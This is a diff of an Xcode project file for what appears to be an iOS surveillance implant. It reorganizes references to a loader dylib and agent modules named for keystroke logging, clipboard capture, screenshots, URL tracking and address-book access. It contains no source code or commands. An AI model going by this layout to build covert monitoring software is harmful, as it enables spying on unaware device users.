@@ -103,6 +103,12 @@
 		52F2B83514F67E1200AB51B2 /* RCSILoader.mm in Sources */ = {isa = PBXBuildFile; fileRef = 1AED88431145605D00AF09E8 /* RCSILoader.mm */; };
 		52F2B83614F67E7700AB51B2 /* RCSISharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AC0E2611056976F00DCFA55 /* RCSISharedMemory.m */; };
 		52F4769F10D7A11A00776574 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52F4769E10D7A11A00776574 /* AddressBook.framework */; };
+		52FAE93614FB8A10003D1527 /* RCSIAgentApplication.m in Sources */ = {isa = PBXBuildFile; fileRef = 52FAE92D14FB8A10003D1527 /* RCSIAgentApplication.m */; };
+		52FAE93714FB8A10003D1527 /* RCSIAgentInputLogger.mm in Sources */ = {isa = PBXBuildFile; fileRef = 52FAE92F14FB8A10003D1527 /* RCSIAgentInputLogger.mm */; };
+		52FAE93814FB8A10003D1527 /* RCSIAgentPasteboard.m in Sources */ = {isa = PBXBuildFile; fileRef = 52FAE93114FB8A10003D1527 /* RCSIAgentPasteboard.m */; };
+		52FAE93914FB8A10003D1527 /* RCSIAgentScreenshot.m in Sources */ = {isa = PBXBuildFile; fileRef = 52FAE93314FB8A10003D1527 /* RCSIAgentScreenshot.m */; };
+		52FAE93A14FB8A10003D1527 /* RCSIAgentURL.m in Sources */ = {isa = PBXBuildFile; fileRef = 52FAE93514FB8A10003D1527 /* RCSIAgentURL.m */; };
+		52FAE93D14FB8A24003D1527 /* RCSILoader.mm in Sources */ = {isa = PBXBuildFile; fileRef = 52FAE93C14FB8A24003D1527 /* RCSILoader.mm */; };
 		C55C53CE14CECA240034B013 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C55C53CD14CECA240034B013 /* AVFoundation.framework */; };
 /* End PBXBuildFile section */
 
@@ -172,12 +178,6 @@
 		1AEB9530138E53540057EB42 /* RCSILogger.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSILogger.m; path = Support/RCSILogger.m; sourceTree = "<group>"; };
 		1AEB9532138E61780057EB42 /* RCSIInfoManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIInfoManager.h; path = Modules/RCSIInfoManager.h; sourceTree = "<group>"; };
 		1AEB9533138E61790057EB42 /* RCSIInfoManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIInfoManager.m; path = Modules/RCSIInfoManager.m; sourceTree = "<group>"; };
-		1AED88421145605D00AF09E8 /* RCSILoader.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSILoader.h; path = ../dylib/RCSILoader.h; sourceTree = "<group>"; };
-		1AED88431145605D00AF09E8 /* RCSILoader.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; name = RCSILoader.mm; path = ../dylib/RCSILoader.mm; sourceTree = "<group>"; };
-		1AED885D114561DE00AF09E8 /* RCSIAgentURL.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIAgentURL.h; path = dylib/Agents/RCSIAgentURL.h; sourceTree = "<group>"; };
-		1AED885E114561DE00AF09E8 /* RCSIAgentURL.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIAgentURL.m; path = dylib/Agents/RCSIAgentURL.m; sourceTree = "<group>"; };
-		1AED88621145620900AF09E8 /* RCSIAgentInputLogger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIAgentInputLogger.h; path = dylib/Agents/RCSIAgentInputLogger.h; sourceTree = "<group>"; };
-		1AED88631145620900AF09E8 /* RCSIAgentInputLogger.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; name = RCSIAgentInputLogger.mm; path = dylib/Agents/RCSIAgentInputLogger.mm; sourceTree = "<group>"; };
 		1AEE1F2E11BD21F60066DE71 /* NSMutableDictionary+ThreadSafe.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "NSMutableDictionary+ThreadSafe.h"; path = "Modules/NSMutableDictionary+ThreadSafe.h"; sourceTree = "<group>"; };
 		1AEE1F2F11BD21F60066DE71 /* NSMutableDictionary+ThreadSafe.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableDictionary+ThreadSafe.m"; path = "Modules/NSMutableDictionary+ThreadSafe.m"; sourceTree = "<group>"; };
 		1AF02168140E32C700A04063 /* UIDevice+machine.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = "UIDevice+machine.h"; path = "Modules/UIDevice+machine.h"; sourceTree = "<group>"; };
@@ -185,8 +185,6 @@
 		1D30AB110D05D00D00671497 /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = System/Library/Frameworks/Foundation.framework; sourceTree = SDKROOT; };
 		1D6058910D05DD3D006BFB54 /* core.ios */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = core.ios; sourceTree = BUILT_PRODUCTS_DIR; };
 		32CA4F630368D1EE00C91783 /* RCSIphone_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSIphone_Prefix.pch; sourceTree = "<group>"; };
-		520052B8114E6E38002508C7 /* RCSIAgentScreenshot.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIAgentScreenshot.h; path = dylib/Agents/RCSIAgentScreenshot.h; sourceTree = "<group>"; };
-		520052B9114E6E38002508C7 /* RCSIAgentScreenshot.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIAgentScreenshot.m; path = dylib/Agents/RCSIAgentScreenshot.m; sourceTree = "<group>"; };
 		520CAB6510E24A0B004A80C4 /* RCSIAgentAddressBook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSIAgentAddressBook.h; path = Modules/Agents/RCSIAgentAddressBook.h; sourceTree = "<group>"; };
 		520CAB6610E24A0B004A80C4 /* RCSIAgentAddressBook.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSIAgentAddressBook.m; path = Modules/Agents/RCSIAgentAddressBook.m; sourceTree = "<group>"; };
 		520E0615126DCEFC00B4F4F0 /* RCSINotificationSupport.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSINotificationSupport.h; sourceTree = "<group>"; };
@@ -499,24 +497,6 @@
 			name = Agents;
 			sourceTree = "<group>";
 		};
-		1AED885B1145613800AF09E8 /* Agents */ = {
-			isa = PBXGroup;
-			children = (
-				52F61F83146BD3E700BB7B4E /* RCSIAgentPasteboard.h */,
-				52F61F84146BD3E700BB7B4E /* RCSIAgentPasteboard.m */,
-				520052B8114E6E38002508C7 /* RCSIAgentScreenshot.h */,
-				520052B9114E6E38002508C7 /* RCSIAgentScreenshot.m */,
-				1AED885D114561DE00AF09E8 /* RCSIAgentURL.h */,
-				1AED885E114561DE00AF09E8 /* RCSIAgentURL.m */,
-				1AED88621145620900AF09E8 /* RCSIAgentInputLogger.h */,
-				1AED88631145620900AF09E8 /* RCSIAgentInputLogger.mm */,
-				523E581312A92AAC00D56FA0 /* RCSIAgentApplication.h */,
-				523E581412A92AAC00D56FA0 /* RCSIAgentApplication.m */,
-			);
-			name = Agents;
-			path = ..;
-			sourceTree = "<group>";
-		};
 		29B97314FDCFA39411CA2CEA /* CustomTemplate */ = {
 			isa = PBXGroup;
 			children = (
@@ -726,11 +706,28 @@
 		52F2B80D14F67D6C00AB51B2 /* ios-dylib */ = {
 			isa = PBXGroup;
 			children = (
-				1AED885B1145613800AF09E8 /* Agents */,
-				1AED88421145605D00AF09E8 /* RCSILoader.h */,
-				1AED88431145605D00AF09E8 /* RCSILoader.mm */,
+				52FAE92B14FB89F0003D1527 /* Agents */,
+				52FAE93B14FB8A24003D1527 /* RCSILoader.h */,
+				52FAE93C14FB8A24003D1527 /* RCSILoader.mm */,
 			);
 			path = "ios-dylib";
+			sourceTree = "<group>";
+		};
+		52FAE92B14FB89F0003D1527 /* Agents */ = {
+			isa = PBXGroup;
+			children = (
+				52FAE92C14FB8A10003D1527 /* RCSIAgentApplication.h */,
+				52FAE92D14FB8A10003D1527 /* RCSIAgentApplication.m */,
+				52FAE92E14FB8A10003D1527 /* RCSIAgentInputLogger.h */,
+				52FAE92F14FB8A10003D1527 /* RCSIAgentInputLogger.mm */,
+				52FAE93014FB8A10003D1527 /* RCSIAgentPasteboard.h */,
+				52FAE93114FB8A10003D1527 /* RCSIAgentPasteboard.m */,
+				52FAE93214FB8A10003D1527 /* RCSIAgentScreenshot.h */,
+				52FAE93314FB8A10003D1527 /* RCSIAgentScreenshot.m */,
+				52FAE93414FB8A10003D1527 /* RCSIAgentURL.h */,
+				52FAE93514FB8A10003D1527 /* RCSIAgentURL.m */,
+			);
+			name = Agents;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
